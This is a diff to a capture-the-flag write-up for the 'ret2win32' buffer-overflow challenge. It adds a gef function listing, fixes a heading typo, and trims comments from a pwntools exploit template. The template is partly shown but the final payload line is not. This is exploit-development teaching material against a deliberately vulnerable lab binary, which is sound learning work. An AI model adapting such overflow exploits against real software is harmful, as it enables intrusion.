@@ -47,6 +47,34 @@ void pwnme(void)
 
 ### Check win function
 ```
+gef➤  info functions 
+All defined functions:
+
+Non-debugging symbols:
+0x080483c0  _init
+0x08048400  printf@plt
+0x08048410  fgets@plt
+0x08048420  puts@plt
+0x08048430  system@plt
+0x08048440  __libc_start_main@plt
+0x08048450  setvbuf@plt
+0x08048460  memset@plt
+0x08048470  __gmon_start__@plt
+0x08048480  _start
+0x080484b0  __x86.get_pc_thunk.bx
+0x080484c0  deregister_tm_clones
+0x080484f0  register_tm_clones
+0x08048530  __do_global_dtors_aux
+0x08048550  frame_dummy
+0x0804857b  main
+0x080485f6  pwnme
+0x08048659  ret2win
+0x08048690  __libc_csu_init
+0x080486f0  __libc_csu_fini
+0x080486f4  _fini
+```
+
+```
 gef➤  disassemble ret2win 
 Dump of assembler code for function ret2win:
    0x08048659 <+0>:     push   ebp
@@ -66,7 +94,7 @@ Dump of assembler code for function ret2win:
 End of assembler dump.
 ```
 
-### Intial
+### Initial
 ```
 gef➤  pattern create 100
 [+] Generating a pattern of 100 bytes
@@ -99,20 +127,11 @@ gef➤  pattern search laaa
 
 ### Payload
 ```python
-#!/usr/bin/env python2
+#!/usr/bin/env python
 # -*- coding: utf-8 -*-
-# This exploit template was generated via:
-# $ pwn template ret2win32
 from pwn import *
 
-# Set up pwntools for the correct architecture
 exe = context.binary = ELF('ret2win32')
-
-# Many built-in settings can be controlled on the command-line and show up
-# in "args".  For example, to dump all data sent/received, and disable ASLR
-# for all created processes...
-# ./exploit.py DEBUG NOASLR
-
 
 def start(argv=[], *a, **kw):
     '''Start the exploit against the target.'''
@@ -121,11 +140,8 @@ def start(argv=[], *a, **kw):
     else:
         return process([exe.path] + argv, *a, **kw)
 
-# Specify your GDB script here for debugging
-# GDB will be launched if the exploit is run via e.g.
-# ./exploit.py GDB
 gdbscript = '''
-break *0x{exe.symbols.main:x}
+tbreak main
 continue
 '''.format(**locals())
 
